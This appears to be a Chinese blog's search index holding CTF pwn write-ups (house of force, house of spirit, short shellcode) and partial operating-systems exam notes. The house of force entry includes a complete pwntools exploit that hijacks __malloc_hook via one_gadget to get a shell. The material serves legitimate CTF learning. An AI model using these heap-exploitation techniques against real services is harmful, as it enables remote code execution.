<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>force-house of force</title>
    <link href="/2024/02/29/force-house-of-force/"/>
    <url>/2024/02/29/force-house-of-force/</url>
    
    <content type="html"><![CDATA[<p>本题出自2020 gyctf。基于GLIBC 2.23-0ubuntu11。</p><p>checksec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">255</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">255</span>, <span class="hljs-keyword">sizeof</span>(s));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1:add&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2:puts&quot;</span>);<br>    read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>uLL);<br>    v3 = atol(nptr);<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    &#123;<br>      add();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">void</span> **i; <span class="hljs-comment">// [rsp+0h] [rbp-120h]</span><br>  __int64 size; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">255</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-keyword">for</span> ( i = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)&amp;unk_202080; *i; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span> *)i - (<span class="hljs-type">char</span> *)&amp;unk_202080 &gt; <span class="hljs-number">39</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>uLL);<br>  size = atol(nptr);<br>  *i = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !*i )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bin addr %p\n&quot;</span>, *i);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content&quot;</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)*i, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现在读入content时限制长度为0x50，那我们就可以尝试较小的malloc从而实现top chunk的控制；对于申请大小没有做限制，通过mmap申请的大堆地址会分配在libc base附近；通过brk申请的小堆地址会分配在.data到_edata；利用题目给出的bin addr的地址可以进一步得到top chunk的位置和libc base的地址。</p><p>puts</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(&amp;byte_D93);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>由此我们可以很清楚地得到解题步骤：通过控制top chunk从而实现任意地址分配，进而控制<code>__malloc_hook</code>或<code>puts</code>为ogg或system并尝试执行即可。</p><p>在直接修改<code>__malloc_hook</code>为ogg时发现并不能通，发现栈未对齐，于是可以使用<code>realloc</code>中的<code>sub rsp, 38h</code>去完成栈对齐即可，那么从<code>__realloc_hook</code>开始的内容应该是：原<code>__realloc_hook</code>的地址对应ogg，<code>__malloc_hook</code>的地址指向<code>__libc_realloc+0x10</code>，实现调用<code>malloc -&gt; __malloc_hook -&gt; __libc_realloc+0x10 -&gt; __realloc_hook -&gt; one_gadget</code>。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ip = <br>port = <br>io = remote(ip, port)<br>elf = ELF(<span class="hljs-string">&#x27;./force&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment"># mmap --&gt; leak libc_base</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;puts\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;size\n&#x27;</span>, <span class="hljs-string">b&#x27;2097152&#x27;</span>) <span class="hljs-comment"># 0x200000</span><br>io.recvuntil(<span class="hljs-string">b&#x27;bin addr 0x&#x27;</span>)<br>lb = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">0x200ff0</span> <span class="hljs-comment"># calculate in gdb</span><br>success(<span class="hljs-string">&#x27;libc_base =&#x27;</span>+<span class="hljs-built_in">hex</span>(lb))<br>io.sendafter(<span class="hljs-string">b&#x27;content\n&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br><span class="hljs-comment"># brk --&gt; change top_chunk</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;puts\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;size\n&#x27;</span>, <span class="hljs-string">b&#x27;24&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;bin addr 0x&#x27;</span>)<br>tc = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">0x10</span><br>io.sendafter(<span class="hljs-string">b&#x27;content\n&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>))<br><span class="hljs-comment"># brk --&gt; __malloc_hook, ready to change</span><br>mh = lb + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>offset = mh - tc - <span class="hljs-number">0x10</span>*<span class="hljs-number">2</span> - <span class="hljs-number">0x10</span> <span class="hljs-comment"># (size+prev_size)*2 + 0x10(prepare for next_chunk)</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;puts\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(offset).encode())<br>io.sendafter(<span class="hljs-string">b&#x27;content\n&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br><span class="hljs-comment"># change __malloc_hook --&gt; ogg</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;puts\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;size\n&#x27;</span>, <span class="hljs-string">b&#x27;16&#x27;</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;content\n&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(lb + <span class="hljs-number">0x4526a</span>)+p64(lb+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]+<span class="hljs-number">0x10</span>))<br>success(<span class="hljs-built_in">hex</span>(libc.sym.__malloc_hook))<br>success(<span class="hljs-built_in">hex</span>(libc.sym.__libc_realloc))<br>io.sendlineafter(<span class="hljs-string">b&#x27;puts\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;size\n&#x27;</span>, <span class="hljs-string">b&#x27;16&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of force是一种可以额外获得更大空间的chunk的一种手法，通过修改top chunk的值来实现，</p><p>影响版本：2.27之前。由于在2.27为chunk添加了检查，在未来版本该手法失效。</p><p>本题考点：mmap分配的大堆会在libc下方，brk分配的小堆会在原本堆栈之间_edata的位置。修改top chunk以绕过堆分割方式，将大堆用brk分配到指定位置以进行进一步控制。</p><p>注意：GLIBC 2.23-0ubuntu11与GLIBC 2.23-0ubuntu11.3部分函数位置不同，例如<code>__libc_realloc</code>。</p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>短shellcode编写指南</title>
    <link href="/2023/12/29/%E7%9F%ADshellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <url>/2023/12/29/%E7%9F%ADshellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>本文shellcode完全代表amd64&#x2F;intel&#x2F;little endian的汇编指令。</p><p><em>shellcode不过就是一段+x的string。</em></p><h2 id="xor还是mov？eax还是rax？"><a href="#xor还是mov？eax还是rax？" class="headerlink" title="xor还是mov？eax还是rax？"></a>xor还是mov？eax还是rax？</h2><p><code>xor rax, rax</code>对应的16进制字符为<code>\x48\x31\xc0</code>，<code>mov rax, 0</code>对应的16进制字符为<code>\x48\xc7\xc0\x00\x00\x00\x00</code>，<code>mov eax, 0</code>对应的16进制字符为<code>\xb8\x00\x00\x00\x00</code>，<code>xor eax, eax</code>对应的16进制字符为<code>\x31\xc0</code>。</p><p><code>mov al, 0</code>和<code>mov ah, 0</code>是不能置空寄存器的。</p><p>可以看到其中最短的是<code>xor eax, eax</code>，该条指令的效果也成功地将rax寄存器置空；最长的是<code>mov rax, 0</code>；并且每种置空方法，xor都要比直接mov为0更短，原因在于数字需要在命令中完全地表示；使用eax的都要比使用rax的要更短，原因在于amd64的设计理念基于x86，rax类似于取了一个QWORD eax，占用字节更大自然就会导致使用字节数更多。</p><p>但是需要注意，当rsp对应位置的值为0时，使用<code>pop rax</code>是最短的，对应的16进制为<code>\x58</code>。</p><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><p>首先我们应该知道mov是汇编里的助记符，而不是二进制里真正的opcode域，不同语境下的mov（如寄存器之间数据传输方向不同）采用的操作码数值也不同，详细可查询intel得指令手册（可以在intel官网下载）。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>oreo-house of spirit</title>
    <link href="/2023/12/22/oreo-house-of-spirit/"/>
    <url>/2023/12/22/oreo-house-of-spirit/</url>
    
    <content type="html"><![CDATA[<p>本题出自2014 hack.lu。基于GLIBC 2.23-0ubuntu11.3。</p><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>主逻辑函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v1 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What would you like to do?\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Add new rifle\n&quot;</span>, <span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Show added rifles\n&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Order selected rifles\n&quot;</span>, <span class="hljs-number">3</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Leave a Message with your Order\n&quot;</span>, <span class="hljs-number">4</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Show current stats\n&quot;</span>, <span class="hljs-number">5</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u. Exit!\n&quot;</span>, <span class="hljs-number">6</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( read_num() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        add();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        show_rifles();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        order();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        message();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        show_stats();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v1;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过一定的分析，可以很简单地发现某个指针_DOWRD大小数据是一个结构体，简单分析后发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rifle</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> descript[<span class="hljs-number">25</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">27</span>];<br>  rifle *next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>大概是这样的。</p><p>（我去我才发现idapro7.7可以自己对这个部分进行分析，idafree8.3没有，离谱好吧，并且函数名和结构体变量名都给标出来了，我也不知道是不是idafree为了减轻远端服务器压力而刻意不去分析或者不去找到，算了差不多，就这样吧）</p><p>1、add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  rifle *v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br><br>  v1 = head;<br>  head = (rifle *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">56u</span>);<br>  <span class="hljs-keyword">if</span> ( head )<br>  &#123;<br>    head-&gt;next = v1;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rifle name: &quot;</span>);<br>    fgets(head-&gt;name, <span class="hljs-number">56</span>, <span class="hljs-built_in">stdin</span>);<br>    cut_enter(head-&gt;name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rifle description: &quot;</span>);<br>    fgets(head-&gt;descript, <span class="hljs-number">0x38</span>, <span class="hljs-built_in">stdin</span>);<br>    cut_enter(head-&gt;descript);<br>    ++rifle_cnt;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something terrible happened!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析add函数，发现在输入时没有严格控制输入大小，都可以对不同的区域进行输入，并且都可以溢出到nexttr部分。add没有对malloc多少次做限制，也就是一直malloc可以到很高的地址直到把mmap占满。</p><p>2、show</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_rifles</span><span class="hljs-params">()</span><br>&#123;<br>  rifle *i; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rifle to be ordered:\n%s\n&quot;</span>, <span class="hljs-string">&quot;===================================&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = head; i; i = i-&gt;next )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, i-&gt;name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Description: %s\n&quot;</span>, i-&gt;descript);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===================================&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这里chunk结构体通过malloc_p成为了一个链表结构，show函数从这个链表头部开始通过malloc_p来逐个输出内容，但是由于前面add的未严格控制输入，那么就可以造成类似的任意读，那么就可以通过这个函数来泄露地址等操作。</p><p>3、free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">order</span><span class="hljs-params">()</span><br>&#123;<br>  rifle *v1; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br>  rifle *ptr; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br><br>  v1 = head;<br>  <span class="hljs-keyword">if</span> ( rifle_cnt )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( v1 )<br>    &#123;<br>      ptr = v1;<br>      v1 = v1-&gt;next;<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    head = <span class="hljs-number">0</span>;<br>    ++order_num;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Okay order submitted!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No rifles to be ordered!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>全给清空了，有点狠，并且置空了，不能自由free而是整个链表都被free。</p><p>4、edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">message</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);<br>  fgets(notice, <span class="hljs-number">128</span>, <span class="hljs-built_in">stdin</span>);<br>  cut_enter(notice);<br>&#125;<br></code></pre></td></tr></table></figure><p>对某个字符串进行输入感觉没什么特殊的地方。</p><p>前文提到add没有限制，并且edit函数可以修改notice指针指向的位置，那么notice指针其实就类似于<code>chunk-&gt;next</code>，那么我们就可以在bss段伪造一个fake chunk，并且指向位置任意，通过edit进行一次fastbin attack，将notice开始部分的next指向hook的位置就可以了，例如说__malloc_hook。</p><p>根据前文的分析：</p><ol><li>show函数的任意读可以帮助我们泄露出libc_base，那么首先头部add一个，让next指向任意一个got表函数地址，然后通过show输出就可以得到libc_base了；</li><li>这时的目的是延长到notice的位置，然后通过修改notice-&gt;next指向某一个可以控制的函数即可。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of spirit是一种fastbin attack，利用free将伪造的fake chunk释放，fake chunk的地址会被放在fastbin链中，实现对任意地址写。</p><p>影响版本：2.23至今，所有含有fastbin的版本。</p><p>fake chunk有如下检查：</p><p>​ISMMAP!&#x3D;1、fake chunk应该满足fastbin的格式（自身size、next的大小，大于2*SIZE_SZ，小于av-&gt;system_mem）、fastbin表头不能是fake chunk</p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统，但是成为内核✌🏻的第一步</title>
    <link href="/2023/12/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%90%E4%B8%BA%E5%86%85%E6%A0%B8%E2%9C%8C%F0%9F%8F%BB%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/"/>
    <url>/2023/12/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%90%E4%B8%BA%E5%86%85%E6%A0%B8%E2%9C%8C%F0%9F%8F%BB%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<p><em><strong>本文章内容完全摘自期末帮，仅作为辅助通过大学课程操作系统期末考试使用。</strong></em></p><p>后续学习请关注《操作系统，但是成为内核✌🏻的第二步》，内容会根据jyy老师的课程作为主色调结合其他非面向应试的知识总结逐步润色完整。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>在计算机系统中</strong>，操作系统是处于裸机之上的第一层软件。</p><p>计算机操作系统是指控制和管理计算机软硬件资源，合理组织计算机的工作流程，方便用户使用的程序集合。</p><p>操作系统的作用主要分为：处理机管理、存储管理、设备管理、文件管理、用户接口管理。</p><h2 id="操作系统的特点"><a href="#操作系统的特点" class="headerlink" title="操作系统的特点"></a>操作系统的特点</h2><p>主要有以下四个特点：并发、共享、虚拟和异步。</p><p><strong>并发</strong>：多个事件同一时间段。</p><p>{</p><p>并发：多个事件在同一<em><strong>时间间隔内</strong></em>发生；</p><p>并行：多个事件在同一<em><strong>时刻</strong></em>发生；</p><p>}</p><p><strong>共享</strong>：系统资源可供并发执行进程共同使用。</p><p>{</p><p>互斥共享：某个进程访问时其他进程不能访问；</p><p>同时共享：多个进程可以同时访问（不一定所有）；</p><p>}</p><p>并发和共享是操作系统的两个最基本的特征，它们互为存在的条件。</p><p><strong>虚拟</strong>：把一个物理实体变为若干个逻辑上的对应物。</p><p><strong>异步</strong>：进程执行顺序和执行时间的不确定性。</p><p>异步的特点：</p><ul><li>进程的运行速度不可预知；</li><li>无论快慢，结果应当相同；</li><li>难以重现系统在某一时刻的状态；</li></ul><p>所以现代操作系统的基本特征是程序的并发执行、资源共享和操作的异步性。</p><h2 id="操作系统的分类"><a href="#操作系统的分类" class="headerlink" title="操作系统的分类"></a>操作系统的分类</h2><h3 id="批处理系统"><a href="#批处理系统" class="headerlink" 